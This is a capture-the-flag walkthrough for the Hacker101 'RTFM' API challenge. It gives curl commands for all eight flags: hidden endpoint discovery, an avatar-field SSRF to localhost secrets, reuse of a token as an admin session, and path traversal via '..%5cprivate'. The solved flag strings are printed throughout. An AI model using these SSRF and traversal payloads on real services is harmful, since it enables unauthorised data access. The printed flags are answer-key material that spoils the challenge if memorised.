# RTFM (Hacker101)

REST-ish API under **`/api/v1/`** with undocumented routes, a published **Swagger** under v2, weak auth checks, **SSRF** via profile fields, and a **path traversal** on analytics. **Eight flags.**

> Replace `BASE` with your instance (e.g. `https://<id>.ctf.hacker101.com`).  
> Example run: `https://f441e7a43330b31fd1ada28db395f307.ctf.hacker101.com/`

Technique walkthroughs in the community notes [RTFM.md (8r0wn13)](https://github.com/8r0wn13/hacker101_ctf/blob/main/RTFM.md) align with the flows below (wordlist fuzzing, `config`, `user` + `login`, `avatar` SSRF, `verbose`, v2 admin, v1 posts, analytics traversal).

---

## Prerequisites

- **`U`** / **`P`**: username and password you register (any values).
- **`T`**: token from **`POST /api/v1/user/login`** (form body: `username`, `password`).

---

## Flag 1 — Swagger off the advertised API root

The home page only mentions **`/api/v1/`**; v2 is not linked. Discover **`/api/v2/swagger.json`** (wordlist / fuzzing on the API path).

```bash
curl -sS "$BASE/api/v2/swagger.json" | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example (this instance):** `^FLAG^07c7c0e67e3ffd22ef11b79db3b25862f775f437deb92f0d5eb63216dc66849f$FLAG$`

---

## Flag 2 — `GET /api/v1/config`

```bash
curl -sS "$BASE/api/v1/config" | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

Flag is in JSON (e.g. `private_key`).

**Example:** `^FLAG^aba4c12f9281819e3d03f0e796e0dc201e672b234891ef6e57860e218001e345$FLAG$`

---

## Flag 3 — `POST /api/v1/user` (create user)

Use **form body** (`application/x-www-form-urlencoded`), not only query strings.

```bash
curl -sS -X POST "$BASE/api/v1/user" \
  -d "username=$U&password=$P"
```

Response includes the next step (`/api/v1/user/login`) and a flag field.

**Example:** `^FLAG^23ff20a04c9e59f22b33f45ae2874a6c5e04b4a70168a05385fb7120b8c177f2$FLAG$`

---

## Flag 4 — SSRF: `PUT /api/v1/user` + `avatar`

1. `POST /api/v1/user/login` with same `username` / `password` → `token`.
2. `PUT /api/v1/user` with header **`X-Token: <token>`** and body **`avatar=http://localhost/api/v1/secrets`** (must start with `http://` or `https://`).

The server fetches the URL; the response is not a valid image, so the API returns an error that **echoes** JSON from the internal **`/api/v1/secrets`** response (including the flag).

```bash
curl -sS -X POST "$BASE/api/v1/user/login" -d "username=$U&password=$P"
curl -sS -X PUT "$BASE/api/v1/user" \
  -H "X-Token: $T" \
  -d 'avatar=http://localhost/api/v1/secrets'
```

**Example:** `^FLAG^a8505cd493e63af9e1c3785154862b368234d17759f20d6c602d3a28022438fe$FLAG$`

---

## Flag 5 — `GET /api/v1/status?verbose=<username>`

```bash
curl -sS "$BASE/api/v1/status?verbose=$U" | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example:** `^FLAG^7745d1d7bb99989d759a2b39abc9f348d2d0f48a6834285ba071e20354a21d20$FLAG$`

---

## Flag 6 — v2 admin list + session reuse

`GET /api/v2/admin/user-list` expects **`X-Session`**. Using the same value as **`X-Token`** works here (token/session confusion).

```bash
curl -sS "$BASE/api/v2/admin/user-list" -H "X-Session: $T"
```

**Example:** `^FLAG^21c334d82fafac14cd9ec32c1d95073a0f6bf8dc809f9ce19a587a0d14dc12f6$FLAG$`

---

## Flag 7 — Same post on **v1** with **`X-Token`**

Swagger documents **`/api/v2/user/posts/{id}`** with **`X-Session`**. The **v1** route **`/api/v1/user/posts/<id>`** accepts **`X-Token`** instead and returns post text + an analytics path.

```bash
curl -sS "$BASE/api/v1/user/posts/1" -H "X-Token: $T"
```

**Example:** `^FLAG^fe90b33ef16b38b07599ad8066c04575be1c579b4d998be533d1b44c19ebf166$FLAG$`

---

## Flag 8 — Path traversal on `post-analytics`

From flag 7, note `analytics` like `/api/v1/post-analytics/<hash>`. Normal `GET` returns view counts. Traverse to the sibling **`private`** endpoint (implementation accepts a backslash-style segment; URL-encode as **`%5c`**).

```bash
curl -sS "$BASE/api/v1/post-analytics/..%5cprivate"
```

**Example:** `^FLAG^2991282eb8d9abfb07e958a82b6a2041e1432fcb0764615a39feebbfeae94184$FLAG$`

---

## Quick map

| # | Technique |
|---|-----------|
| 1 | Discover **`/api/v2/swagger.json`** |
| 2 | **`GET /api/v1/config`** |
| 3 | **`POST /api/v1/user`** (form body) |
| 4 | **`PUT`** profile **`avatar`** → SSRF **`http://localhost/api/v1/secrets`** |
| 5 | **`GET /api/v1/status?verbose=<user>`** |
| 6 | **`GET /api/v2/admin/user-list`** + **`X-Session: <token>`** |
| 7 | **`GET /api/v1/user/posts/1`** + **`X-Token`** |
| 8 | **`GET /api/v1/post-analytics/..%5cprivate`** |

---

## License

Challenge content is © HackerOne / Hacker101. These notes are for education only.
